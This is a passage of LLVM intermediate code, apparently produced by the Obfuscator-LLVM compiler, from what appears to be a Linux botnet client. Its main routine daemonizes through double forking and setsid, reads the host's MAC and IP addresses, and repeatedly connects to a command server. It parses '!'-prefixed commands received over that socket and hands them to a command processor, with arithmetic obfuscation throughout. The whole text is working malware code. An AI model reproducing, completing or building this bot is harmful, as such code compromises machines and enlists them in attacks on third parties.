; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %102

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %101

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 0, %95
  %97 = sub i32 0, 1
  %98 = add i32 %96, %97
  %99 = sub i32 0, %98
  %100 = add nsw i32 %95, 1
  store i32 %99, i32* %10, align 4
  br label %79

; <label>:101:                                    ; preds = %79
  br label %102

; <label>:102:                                    ; preds = %101, %65
  %103 = load i32, i32* %2, align 4
  %104 = call i32 @close(i32 %103)
  br label %105

; <label>:105:                                    ; preds = %102, %36, %29, %15
  %106 = load i32, i32* %1, align 4
  ret i32 %106
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [50 x i8], align 16
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i32, align 4
  %11 = alloca [11 x i8], align 1
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca [4096 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca [10 x i8*], align 16
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %28 = bitcast [50 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %28, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @main.ismokeweed, i32 0, i32 0), i64 50, i32 16, i1 false)
  %29 = load i32, i32* %6, align 4
  store i32 %29, i32* %10, align 4
  %30 = bitcast [11 x i8]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %30, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @main.r00t3d, i32 0, i32 0), i64 11, i32 1, i1 false)
  %31 = getelementptr inbounds [50 x i8], [50 x i8]* %8, i32 0, i32 0
  %32 = call %struct._IO_FILE* @fopen(i8* %31, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.79, i32 0, i32 0))
  store %struct._IO_FILE* %32, %struct._IO_FILE** %9, align 8
  %33 = getelementptr inbounds [11 x i8], [11 x i8]* %11, i32 0, i32 0
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %35 = call i64 @fwrite(i8* %33, i64 1, i64 11, %struct._IO_FILE* %34)
  %36 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %37 = call i32 @fileno(%struct._IO_FILE* %36) #2
  %38 = call i32 (i32, i32, ...) bitcast (i32 (...)* @fchmod to i32 (i32, i32, ...)*)(i32 %37, i32 3071)
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %40 = call i32 @fileno(%struct._IO_FILE* %39) #2
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = call i32 (i32, i64, ...) @ioctl(i32 %40, i64 %42, i32* %10) #2
  %44 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %45 = call i32 @fclose(%struct._IO_FILE* %44)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = call i32 @getpid() #2
  %48 = xor i32 %46, -1
  %49 = and i32 %47, %48
  %50 = xor i32 %47, -1
  %51 = and i32 %46, %50
  %52 = or i32 %49, %51
  %53 = xor i32 %46, %47
  call void @srand(i32 %52) #2
  %54 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %55 = call i32 @getpid() #2
  %56 = xor i32 %54, -1
  %57 = and i32 %55, %56
  %58 = xor i32 %55, -1
  %59 = and i32 %54, %58
  %60 = or i32 %57, %59
  %61 = xor i32 %54, %55
  call void @init_rand(i32 %60)
  %62 = call i32 @getOurIP()
  %63 = call i32 @fork() #2
  store i32 %63, i32* %12, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %68

; <label>:65:                                     ; preds = %2
  %66 = load i32, i32* %12, align 4
  %67 = call i32 @waitpid(i32 %66, i32* %14, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:68:                                     ; preds = %2
  %69 = load i32, i32* %12, align 4
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %83, label %71

; <label>:71:                                     ; preds = %68
  %72 = call i32 @fork() #2
  store i32 %72, i32* %13, align 4
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %71
  call void @exit(i32 0) #14
  unreachable

; <label>:75:                                     ; preds = %71
  %76 = load i32, i32* %13, align 4
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %79, label %78

; <label>:78:                                     ; preds = %75
  br label %81

; <label>:79:                                     ; preds = %75
  %80 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i32 0, i32 0))
  br label %81

; <label>:81:                                     ; preds = %79, %78
  br label %82

; <label>:82:                                     ; preds = %81
  br label %85

; <label>:83:                                     ; preds = %68
  %84 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i32 0, i32 0))
  br label %85

; <label>:85:                                     ; preds = %83, %82
  br label %86

; <label>:86:                                     ; preds = %85
  %87 = call i32 @setsid() #2
  %88 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #2
  %89 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %90

; <label>:90:                                     ; preds = %400, %93, %86
  %91 = call i32 @initConnection()
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %95

; <label>:93:                                     ; preds = %90
  %94 = call i32 @sleep(i32 5)
  br label %90

; <label>:95:                                     ; preds = %90
  store i32 0, i32* %16, align 4
  store i32 0, i32* %17, align 4
  br label %96

; <label>:96:                                     ; preds = %399, %248, %210, %95
  %97 = load i32, i32* @mainCommSock, align 4
  %98 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %99 = call i32 @recvLine(i32 %97, i8* %98, i32 4096)
  store i32 %99, i32* %16, align 4
  %100 = icmp ne i32 %99, -1
  br i1 %100, label %101, label %400

; <label>:101:                                    ; preds = %96
  store i32 0, i32* %17, align 4
  br label %102

; <label>:102:                                    ; preds = %195, %101
  %103 = load i32, i32* %17, align 4
  %104 = sext i32 %103 to i64
  %105 = load i64, i64* @numpids, align 8
  %106 = icmp ult i64 %104, %105
  br i1 %106, label %107, label %201

; <label>:107:                                    ; preds = %102
  %108 = load i32*, i32** @pids, align 8
  %109 = load i32, i32* %17, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = call i32 @waitpid(i32 %112, i32* null, i32 1)
  %114 = icmp sgt i32 %113, 0
  br i1 %114, label %115, label %194

; <label>:115:                                    ; preds = %107
  %116 = load i32, i32* %17, align 4
  %117 = add i32 %116, -1229677445
  %118 = add i32 %117, 1
  %119 = sub i32 %118, -1229677445
  %120 = add nsw i32 %116, 1
  store i32 %119, i32* %19, align 4
  br label %121

; <label>:121:                                    ; preds = %139, %115
  %122 = load i32, i32* %19, align 4
  %123 = zext i32 %122 to i64
  %124 = load i64, i64* @numpids, align 8
  %125 = icmp ult i64 %123, %124
  br i1 %125, label %126, label %145

; <label>:126:                                    ; preds = %121
  %127 = load i32*, i32** @pids, align 8
  %128 = load i32, i32* %19, align 4
  %129 = zext i32 %128 to i64
  %130 = getelementptr inbounds i32, i32* %127, i64 %129
  %131 = load i32, i32* %130, align 4
  %132 = load i32*, i32** @pids, align 8
  %133 = load i32, i32* %19, align 4
  %134 = sub i32 0, 1
  %135 = add i32 %133, %134
  %136 = sub i32 %133, 1
  %137 = zext i32 %135 to i64
  %138 = getelementptr inbounds i32, i32* %132, i64 %137
  store i32 %131, i32* %138, align 4
  br label %139

; <label>:139:                                    ; preds = %126
  %140 = load i32, i32* %19, align 4
  %141 = sub i32 %140, 683362343
  %142 = add i32 %141, 1
  %143 = add i32 %142, 683362343
  %144 = add i32 %140, 1
  store i32 %143, i32* %19, align 4
  br label %121

; <label>:145:                                    ; preds = %121
  %146 = load i32*, i32** @pids, align 8
  %147 = load i32, i32* %19, align 4
  %148 = add i32 %147, -1599955297
  %149 = sub i32 %148, 1
  %150 = sub i32 %149, -1599955297
  %151 = sub i32 %147, 1
  %152 = zext i32 %150 to i64
  %153 = getelementptr inbounds i32, i32* %146, i64 %152
  store i32 0, i32* %153, align 4
  %154 = load i64, i64* @numpids, align 8
  %155 = sub i64 0, %154
  %156 = sub i64 0, -1
  %157 = add i64 %155, %156
  %158 = sub i64 0, %157
  %159 = add i64 %154, -1
  store i64 %158, i64* @numpids, align 8
  %160 = load i64, i64* @numpids, align 8
  %161 = sub i64 0, %160
  %162 = sub i64 0, 1
  %163 = add i64 %161, %162
  %164 = sub i64 0, %163
  %165 = add i64 %160, 1
  %166 = mul i64 %164, 4
  %167 = call noalias i8* @malloc(i64 %166) #2
  %168 = bitcast i8* %167 to i32*
  store i32* %168, i32** %18, align 8
  store i32 0, i32* %19, align 4
  br label %169

; <label>:169:                                    ; preds = %184, %145
  %170 = load i32, i32* %19, align 4
  %171 = zext i32 %170 to i64
  %172 = load i64, i64* @numpids, align 8
  %173 = icmp ult i64 %171, %172
  br i1 %173, label %174, label %190

; <label>:174:                                    ; preds = %169
  %175 = load i32*, i32** @pids, align 8
  %176 = load i32, i32* %19, align 4
  %177 = zext i32 %176 to i64
  %178 = getelementptr inbounds i32, i32* %175, i64 %177
  %179 = load i32, i32* %178, align 4
  %180 = load i32*, i32** %18, align 8
  %181 = load i32, i32* %19, align 4
  %182 = zext i32 %181 to i64
  %183 = getelementptr inbounds i32, i32* %180, i64 %182
  store i32 %179, i32* %183, align 4
  br label %184

; <label>:184:                                    ; preds = %174
  %185 = load i32, i32* %19, align 4
  %186 = add i32 %185, -1317999462
  %187 = add i32 %186, 1
  %188 = sub i32 %187, -1317999462
  %189 = add i32 %185, 1
  store i32 %188, i32* %19, align 4
  br label %169

; <label>:190:                                    ; preds = %169
  %191 = load i32*, i32** @pids, align 8
  %192 = bitcast i32* %191 to i8*
  call void @free(i8* %192) #2
  %193 = load i32*, i32** %18, align 8
  store i32* %193, i32** @pids, align 8
  br label %194

; <label>:194:                                    ; preds = %190, %107
  br label %195

; <label>:195:                                    ; preds = %194
  %196 = load i32, i32* %17, align 4
  %197 = add i32 %196, 249481390
  %198 = add i32 %197, 1
  %199 = sub i32 %198, 249481390
  %200 = add nsw i32 %196, 1
  store i32 %199, i32* %17, align 4
  br label %102

; <label>:201:                                    ; preds = %102
  %202 = load i32, i32* %16, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 %203
  store i8 0, i8* %204, align 1
  %205 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  call void @trim(i8* %205)
  %206 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %207 = call i8* @strstr(i8* %206, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i32 0, i32 0)) #10
  %208 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %209 = icmp eq i8* %207, %208
  br i1 %209, label %210, label %213

; <label>:210:                                    ; preds = %201
  %211 = load i32, i32* @mainCommSock, align 4
  %212 = call i32 (i32, i8*, ...) @sockprintf(i32 %211, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.82, i32 0, i32 0))
  br label %96

; <label>:213:                                    ; preds = %201
  %214 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %215 = call i8* @strstr(i8* %214, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i32 0, i32 0)) #10
  %216 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %217 = icmp eq i8* %215, %216
  br i1 %217, label %218, label %219

; <label>:218:                                    ; preds = %213
  call void @exit(i32 0) #14
  unreachable

; <label>:219:                                    ; preds = %213
  %220 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  store i8* %220, i8** %20, align 8
  %221 = load i8*, i8** %20, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 33
  br i1 %224, label %225, label %399

; <label>:225:                                    ; preds = %219
  %226 = load i8*, i8** %20, align 8
  %227 = getelementptr inbounds i8, i8* %226, i64 1
  store i8* %227, i8** %21, align 8
  br label %228

; <label>:228:                                    ; preds = %240, %225
  %229 = load i8*, i8** %21, align 8
  %230 = load i8, i8* %229, align 1
  %231 = zext i8 %230 to i32
  %232 = icmp ne i32 %231, 32
  br i1 %232, label %233, label %238

; <label>:233:                                    ; preds = %228
  %234 = load i8*, i8** %21, align 8
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i32
  %237 = icmp ne i32 %236, 0
  br label %238

; <label>:238:                                    ; preds = %233, %228
  %239 = phi i1 [ false, %228 ], [ %237, %233 ]
  br i1 %239, label %240, label %243

; <label>:240:                                    ; preds = %238
  %241 = load i8*, i8** %21, align 8
  %242 = getelementptr inbounds i8, i8* %241, i32 1
  store i8* %242, i8** %21, align 8
  br label %228

; <label>:243:                                    ; preds = %238
  %244 = load i8*, i8** %21, align 8
  %245 = load i8, i8* %244, align 1
  %246 = zext i8 %245 to i32
  %247 = icmp eq i32 %246, 0
  br i1 %247, label %248, label %249

; <label>:248:                                    ; preds = %243
  br label %96

; <label>:249:                                    ; preds = %243
  %250 = load i8*, i8** %21, align 8
  store i8 0, i8* %250, align 1
  %251 = load i8*, i8** %20, align 8
  %252 = getelementptr inbounds i8, i8* %251, i64 1
  store i8* %252, i8** %21, align 8
  %253 = load i8*, i8** %20, align 8
  %254 = load i8*, i8** %21, align 8
  %255 = call i64 @strlen(i8* %254) #10
  %256 = getelementptr inbounds i8, i8* %253, i64 %255
  %257 = getelementptr inbounds i8, i8* %256, i64 2
  store i8* %257, i8** %20, align 8
  br label %258

; <label>:258:                                    ; preds = %284, %249
  %259 = load i8*, i8** %20, align 8
  %260 = load i8*, i8** %20, align 8
  %261 = call i64 @strlen(i8* %260) #10
  %262 = sub i64 %261, -5784338158414099941
  %263 = sub i64 %262, 1
  %264 = add i64 %263, -5784338158414099941
  %265 = sub i64 %261, 1
  %266 = getelementptr inbounds i8, i8* %259, i64 %264
  %267 = load i8, i8* %266, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp eq i32 %268, 10
  br i1 %269, label %282, label %270

; <label>:270:                                    ; preds = %258
  %271 = load i8*, i8** %20, align 8
  %272 = load i8*, i8** %20, align 8
  %273 = call i64 @strlen(i8* %272) #10
  %274 = add i64 %273, -5135138524849172234
  %275 = sub i64 %274, 1
  %276 = sub i64 %275, -5135138524849172234
  %277 = sub i64 %273, 1
  %278 = getelementptr inbounds i8, i8* %271, i64 %276
  %279 = load i8, i8* %278, align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 13
  br label %282

; <label>:282:                                    ; preds = %270, %258
  %283 = phi i1 [ true, %258 ], [ %281, %270 ]
  br i1 %283, label %284, label %293

; <label>:284:                                    ; preds = %282
  %285 = load i8*, i8** %20, align 8
  %286 = load i8*, i8** %20, align 8
  %287 = call i64 @strlen(i8* %286) #10
  %288 = add i64 %287, -7369200340307962632
  %289 = sub i64 %288, 1
  %290 = sub i64 %289, -7369200340307962632
  %291 = sub i64 %287, 1
  %292 = getelementptr inbounds i8, i8* %285, i64 %290
  store i8 0, i8* %292, align 1
  br label %258

; <label>:293:                                    ; preds = %282
  %294 = load i8*, i8** %20, align 8
  store i8* %294, i8** %22, align 8
  br label %295

; <label>:295:                                    ; preds = %307, %293
  %296 = load i8*, i8** %20, align 8
  %297 = load i8, i8* %296, align 1
  %298 = zext i8 %297 to i32
  %299 = icmp ne i32 %298, 32
  br i1 %299, label %300, label %305

; <label>:300:                                    ; preds = %295
  %301 = load i8*, i8** %20, align 8
  %302 = load i8, i8* %301, align 1
  %303 = zext i8 %302 to i32
  %304 = icmp ne i32 %303, 0
  br label %305

; <label>:305:                                    ; preds = %300, %295
  %306 = phi i1 [ false, %295 ], [ %304, %300 ]
  br i1 %306, label %307, label %310

; <label>:307:                                    ; preds = %305
  %308 = load i8*, i8** %20, align 8
  %309 = getelementptr inbounds i8, i8* %308, i32 1
  store i8* %309, i8** %20, align 8
  br label %295

; <label>:310:                                    ; preds = %305
  %311 = load i8*, i8** %20, align 8
  store i8 0, i8* %311, align 1
  %312 = load i8*, i8** %20, align 8
  %313 = getelementptr inbounds i8, i8* %312, i32 1
  store i8* %313, i8** %20, align 8
  %314 = load i8*, i8** %22, align 8
  store i8* %314, i8** %23, align 8
  br label %315

; <label>:315:                                    ; preds = %319, %310
  %316 = load i8*, i8** %23, align 8
  %317 = load i8, i8* %316, align 1
  %318 = icmp ne i8 %317, 0
  br i1 %318, label %319, label %328

; <label>:319:                                    ; preds = %315
  %320 = load i8*, i8** %23, align 8
  %321 = load i8, i8* %320, align 1
  %322 = zext i8 %321 to i32
  %323 = call i32 @toupper(i32 %322) #10
  %324 = trunc i32 %323 to i8
  %325 = load i8*, i8** %23, align 8
  store i8 %324, i8* %325, align 1
  %326 = load i8*, i8** %23, align 8
  %327 = getelementptr inbounds i8, i8* %326, i32 1
  store i8* %327, i8** %23, align 8
  br label %315

; <label>:328:                                    ; preds = %315
  store i32 1, i32* %25, align 4
  %329 = load i8*, i8** %20, align 8
  %330 = call i8* @strtok(i8* %329, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %330, i8** %26, align 8
  %331 = load i8*, i8** %22, align 8
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 0
  store i8* %331, i8** %332, align 16
  br label %333

; <label>:333:                                    ; preds = %374, %328
  %334 = load i8*, i8** %26, align 8
  %335 = icmp ne i8* %334, null
  br i1 %335, label %336, label %376

; <label>:336:                                    ; preds = %333
  %337 = load i8*, i8** %26, align 8
  %338 = load i8, i8* %337, align 1
  %339 = zext i8 %338 to i32
  %340 = icmp ne i32 %339, 10
  br i1 %340, label %341, label %374

; <label>:341:                                    ; preds = %336
  %342 = load i8*, i8** %26, align 8
  %343 = call i64 @strlen(i8* %342) #10
  %344 = sub i64 %343, 9151197720851215182
  %345 = add i64 %344, 1
  %346 = add i64 %345, 9151197720851215182
  %347 = add i64 %343, 1
  %348 = call noalias i8* @malloc(i64 %346) #2
  %349 = load i32, i32* %25, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %350
  store i8* %348, i8** %351, align 8
  %352 = load i32, i32* %25, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %353
  %355 = load i8*, i8** %354, align 8
  %356 = load i8*, i8** %26, align 8
  %357 = call i64 @strlen(i8* %356) #10
  %358 = sub i64 0, %357
  %359 = sub i64 0, 1
  %360 = add i64 %358, %359
  %361 = sub i64 0, %360
  %362 = add i64 %357, 1
  call void @llvm.memset.p0i8.i64(i8* %355, i8 0, i64 %361, i32 1, i1 false)
  %363 = load i32, i32* %25, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %364
  %366 = load i8*, i8** %365, align 8
  %367 = load i8*, i8** %26, align 8
  %368 = call i8* @strcpy(i8* %366, i8* %367) #2
  %369 = load i32, i32* %25, align 4
  %370 = add i32 %369, -1965170512
  %371 = add i32 %370, 1
  %372 = sub i32 %371, -1965170512
  %373 = add nsw i32 %369, 1
  store i32 %372, i32* %25, align 4
  br label %374

; <label>:374:                                    ; preds = %341, %336
  %375 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %375, i8** %26, align 8
  br label %333

; <label>:376:                                    ; preds = %333
  %377 = load i32, i32* %25, align 4
  %378 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i32 0, i32 0
  call void @processCmd(i32 %377, i8** %378)
  %379 = load i32, i32* %25, align 4
  %380 = icmp sgt i32 %379, 1
  br i1 %380, label %381, label %398

; <label>:381:                                    ; preds = %376
  store i32 1, i32* %27, align 4
  store i32 1, i32* %27, align 4
  br label %382

; <label>:382:                                    ; preds = %391, %381
  %383 = load i32, i32* %27, align 4
  %384 = load i32, i32* %25, align 4
  %385 = icmp slt i32 %383, %384
  br i1 %385, label %386, label %397

; <label>:386:                                    ; preds = %382
  %387 = load i32, i32* %27, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %388
  %390 = load i8*, i8** %389, align 8
  call void @free(i8* %390) #2
  br label %391

; <label>:391:                                    ; preds = %386
  %392 = load i32, i32* %27, align 4
  %393 = sub i32 %392, 184406225
  %394 = add i32 %393, 1
  %395 = add i32 %394, 184406225
  %396 = add nsw i32 %392, 1
  store i32 %395, i32* %27, align 4
  br label %382

; <label>:397:                                    ; preds = %382
  br label %398

; <label>:398:                                    ; preds = %397, %376
  br label %399

; <label>:399:                                    ; preds = %398, %219
  br label %96

; <label>:400:                                    ; preds = %96
  br label %90
                                                  ; No predecessors!
  %402 = load i32, i32* %3, align 4
  ret i32 %402
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i64 @fwrite(i8*, i64, i64, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @fileno(%struct._IO_FILE*) #4

declare i32 @fchmod(...) #3

declare i32 @fclose(%struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146623954}
!2 = !{i32 -2146623263}
!3 = !{i32 -2146622514}
!4 = !{i32 -2146621691}
!5 = !{i32 -2146620881}
!6 = !{i32 -2146619630}
